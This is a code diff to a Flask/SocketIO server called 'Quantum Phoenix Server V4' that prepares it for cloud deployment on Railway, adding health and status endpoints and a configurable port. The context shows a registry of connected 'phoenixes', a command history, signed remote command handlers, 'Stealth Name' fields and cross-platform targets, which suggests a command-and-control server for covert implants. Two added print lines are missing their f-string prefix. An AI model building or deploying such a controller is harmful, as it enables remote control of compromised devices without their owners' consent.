@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO
-import hashlib, hmac, json, time, subprocess
+import hashlib, hmac, json, time, subprocess, os
 from datetime import datetime
 
 app = Flask(__name__)
@@ -451,6 +451,28 @@ HTML = '''<!DOCTYPE html>
 def quantum_control():
     return render_template_string(HTML)
 
+@app.route('/health')
+def health_check():
+    """Health check endpoint for Railway"""
+    return {
+        'status': 'ok', 
+        'service': 'Quantum Phoenix Server V4',
+        'active_phoenixes': len(PHOENIX_REGISTRY),
+        'timestamp': datetime.now().isoformat()
+    }
+
+@app.route('/status')
+def status():
+    """Server status endpoint"""
+    return {
+        'server': 'Quantum Phoenix Control V4',
+        'version': '4.0',
+        'platforms_supported': ['android', 'linux', 'windows', 'macos'],
+        'active_connections': len(PHOENIX_REGISTRY),
+        'command_history_count': len(COMMAND_HISTORY),
+        'uptime': 'running'
+    }
+
 @socketio.on('quantum_command')
 def handle_quantum_command(data):
     """Handle signed quantum commands"""
@@ -509,12 +531,18 @@ def handle_phoenix_quantum(data):
     print(f"   Safe Mode: {data.get('safe', False)}")
     print(f"   Stealth Name: {data.get('s', 'unknown')}")
 
+# For Railway deployment
+application = app
+
 if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
     print("🚀 QUANTUM PHOENIX SERVER V4 STARTED")
-    print("📍 Access: http://localhost:5000")
+    print(f"📍 Access: http://localhost:{port}")
     print("🔐 Secure command channel active")
     print("🌐 Cross-platform support enabled")
     print("📊 Real-time monitoring ready")
+    print("🏥 Health check: http://localhost:{port}/health")
+    print("📈 Status: http://localhost:{port}/status")
     print("=" * 50)
     
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+    socketio.run(app, host='0.0.0.0', port=port, debug=False)
